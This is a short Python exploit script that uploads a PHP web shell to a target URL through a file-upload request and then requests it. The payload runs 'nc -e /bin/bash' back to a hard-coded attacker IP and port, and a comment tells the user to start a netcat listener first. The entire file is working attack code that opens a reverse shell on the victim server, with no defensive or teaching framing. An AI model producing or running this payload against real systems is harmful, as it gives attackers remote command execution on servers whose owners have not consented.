# remember to run ' nc -lvp <port> ' before running the exploit.
import requests
import socket
import os
import subprocess

def exploit(target_url):
    # Customize the payload based on the specific vulnerability
    # This payload creates a reverse shell using netcat
    payload = "<?php system('nc -e /bin/bash {ATTACKER_IP} {PORT}'); ?>"
    
    # Replace {ATTACKER_IP} and {PORT} with the actual attacker IP and port
    payload = payload.replace("{ATTACKER_IP}", "192.168.1.100")
    payload = payload.replace("{PORT}", "4444")
    
    # Upload the payload to the target system
    files = {'file': ('shell.php', payload, 'application/x-php')}
    response = requests.post(target_url, files=files)
    
    # Check if the payload was successfully uploaded
    if response.status_code == 200:
        print("Payload uploaded successfully.")
    else:
        print("Failed to upload the payload.")
    
    # Trigger the exploit by accessing the uploaded payload
    exploit_url = target_url + "shell.php"
    response = requests.get(exploit_url)
    
    # Check if the exploit was successful
    if response.status_code == 200:
        print("Exploit successful.")
        print("Response:")
        print(response.text)
    else:
        print("Exploit failed.")

# Example usage
target_url = "http://example.com/"
exploit(target_url)